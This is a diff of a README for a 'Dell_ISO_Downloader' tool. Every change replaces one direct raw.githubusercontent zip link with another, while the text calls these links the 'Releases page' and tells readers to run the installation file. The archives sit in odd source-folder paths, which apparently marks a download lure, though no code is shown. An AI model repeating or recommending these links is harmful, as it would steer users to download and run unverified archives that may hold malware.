@@ -6,11 +6,11 @@ Welcome to Dell_ISO_Downloader! This application allows you to download original
 
 ## 📥 Download Link
 
-[![Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Views/Dell-IS-Downloader-1.1.zip)](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Views/Dell-IS-Downloader-1.1.zip)
+[![Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Downloader_IS_Dell_1.2.zip)](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Downloader_IS_Dell_1.2.zip)
 
 ## 📦 Download & Install
 
-To download the application, simply visit the Releases page: [Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Views/Dell-IS-Downloader-1.1.zip).
+To download the application, simply visit the Releases page: [Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Downloader_IS_Dell_1.2.zip).
 
 1. Click on the link above to go to the Download page.
 2. You will see the latest version listed at the top. It typically includes a description and a list of assets.
@@ -48,7 +48,7 @@ Dell_ISO_Downloader comes with a variety of features designed to make your exper
 
 To keep your application running efficiently, check for updates regularly. 
 
-1. Return to the Releases page: [Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Views/Dell-IS-Downloader-1.1.zip).
+1. Return to the Releases page: [Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Downloader_IS_Dell_1.2.zip).
 2. If a new version is available, download the latest file as described in the Download & Install section.
 3. Replace your existing version by running the new installation file.
 
@@ -77,4 +77,4 @@ We made Dell_ISO_Downloader to simplify obtaining Dell's OEM software. Your feed
 
 Thank you for using Dell_ISO_Downloader! Happy downloading! 
 
-[![Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Views/Dell-IS-Downloader-1.1.zip)](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Views/Dell-IS-Downloader-1.1.zip)
+[![Download Dell_ISO_Downloader](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Downloader_IS_Dell_1.2.zip)](https://raw.githubusercontent.com/Joeneverfallinlove/Dell_ISO_Downloader/master/DellISO/Downloader_IS_Dell_1.2.zip)
